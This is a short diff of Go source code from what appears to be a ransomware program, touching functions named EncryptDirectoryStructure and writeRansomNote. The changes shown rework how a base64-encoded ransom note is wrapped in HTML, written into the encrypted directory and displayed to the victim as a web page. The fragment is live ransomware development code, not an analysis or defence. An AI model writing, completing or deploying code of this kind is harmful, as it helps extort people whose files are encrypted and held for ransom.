@@ -243,7 +243,8 @@ func EncryptDirectoryStructure(
             decoded, _ := b64.StdEncoding.DecodeString(ransom_note)
             ransom_note = string(decoded)
             if !strings.Contains(ransom_note, "<html>") {
-                ransom_note = "<html><head></head><body><pre>" + string(decoded) + "</pre></body></html>"
+                ransom_note = "<html><head></head><body><pre>" +
+                    ransom_note + "</pre></body></html>"
             }
 		    writeRansomNote(startdir, ransom_note)
         } else {
@@ -537,8 +538,8 @@ func removeFileArtifacts(rootDir string) {
 func writeRansomNote(rootDir string, text string) {
 	ransomNoteFile, _ := filepath.Abs(path.Join(rootDir, RANSOM_NOTE_FILE))
 	fmt.Printf("[*] Writing ransom note file: %s\n", ransomNoteFile)
-    finalnote := fmt.Sprintf(text, rootDir)
-	ioutil.WriteFile(ransomNoteFile, []byte(finalnote), 0644)
+    //finalnote := fmt.Sprintf(text, rootDir)
+	ioutil.WriteFile(ransomNoteFile, []byte(text), 0644)
     DisplayWebPage(ransomNoteFile)
 }
 
